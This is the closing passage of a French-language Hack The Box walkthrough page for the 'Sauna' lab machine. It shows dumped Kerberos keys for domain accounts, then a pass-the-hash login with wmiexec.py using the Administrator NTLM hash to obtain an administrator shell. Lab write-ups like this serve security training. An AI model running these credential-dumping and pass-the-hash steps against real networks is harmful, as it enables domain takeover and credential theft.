+EGOTISTICAL-BANK.LOCAL\FSmith:aes256-cts-hmac-sha1-96:8bb69cf20ac8e4dddb4b8065d6d622ec805848922026586878422af67ebd61e2
+EGOTISTICAL-BANK.LOCAL\FSmith:aes128-cts-hmac-sha1-96:6c6b07440ed43f8d15e671846d5b843b
+EGOTISTICAL-BANK.LOCAL\FSmith:des-cbc-md5:b50e02ab0d85f76b
+EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes256-cts-hmac-sha1-96:6f7fd4e71acd990a534bf98df1cb8be43cb476b00a8b4495e2538cff2efaacba
+EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes128-cts-hmac-sha1-96:8ea32a31a1e22cb272870d79ca6d972c
+EGOTISTICAL-BANK.LOCAL\svc_loanmgr:des-cbc-md5:2a896d16c28cf4a2
+SAUNA$:aes256-cts-hmac-sha1-96:ace005f6cec7d0c39b54a2bc7c55637bfede1ef5c02bdf7056b71770a3563ea2
+SAUNA$:aes128-cts-hmac-sha1-96:c46b61ef2fff501974152d8e0871bd4e
+SAUNA$:des-cbc-md5:104c515b86739e08
+[*] Cleaning up... 
+
+</code></pre>
+
+<p>À ce stade, nous avons toutes les cartes en main pour compromettre la machine, puisqu&rsquo;on dispose du hash NTLM du compte Administrateur du domaine, que l&rsquo;on peut utiliser en <code>Pass the Hash</code> afin d&rsquo;accéder à la machine.</p>
+
+<pre><code class="language-bash">$ wmiexec.py egotistical-bank/Administrator@10.10.10.175 -hashes 'aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff' 
+Impacket v0.9.21.dev1+20200220.181330.03cbe6e8 - Copyright 2020 SecureAuth Corporation
+
+[*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+C:\&gt;whoami
+egotisticalbank\administrator
+
+C:\&gt;hostname
+SAUNA
+
+C:\&gt;dir C:\Users\Administrator\Desktop
+ Volume in drive C has no label.
+ Volume Serial Number is 489C-D8FC
+
+ Directory of C:\Users\Administrator\Desktop
+
+01/23/2020  03:11 PM    &lt;DIR&gt;          .
+01/23/2020  03:11 PM    &lt;DIR&gt;          ..
+01/23/2020  10:22 AM                32 root.txt
+               1 File(s)             32 bytes
+               2 Dir(s)   7,982,071,808 bytes free
+
+</code></pre>
+
+<p>w00ted !</p>
+  </div>
+  
+
+<div class="post--navigation post--navigation-single">
+    
+    <a href="/fr/walkthroughs/hackthebox/monteverde/" class="post--navigation-prev">
+      <i aria-hidden="true" class="fa fa-chevron-left"></i>
+      <span class="navigation-tittle">Hack The Box - Monteverde</span>
+    </a>
+    
+    
+</div>
+
+
+  
+
+  
+    
+
+
+</article>
+
+
+        </div>
+        
+    
+  
+  
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-126182747-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+
+<script defer src="https://use.fontawesome.com/releases/v5.2.0/js/all.js"
+  integrity="sha384-4oV5EgaV02iISL2ban6c/RmotsABqE4yZxZLcYMAdG7FAPsyHYAPpywE9PJo+Khy"
+  crossorigin="anonymous">
+</script>
+
+
+    
+        
+        
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
+        
+        <script type="text/javascript">
+            hljs.configure({languages: []});
+            hljs.initHighlightingOnLoad();
+        </script>
+        
+        
+
+
+
+    
+
+
+
+    </body>
+</html>
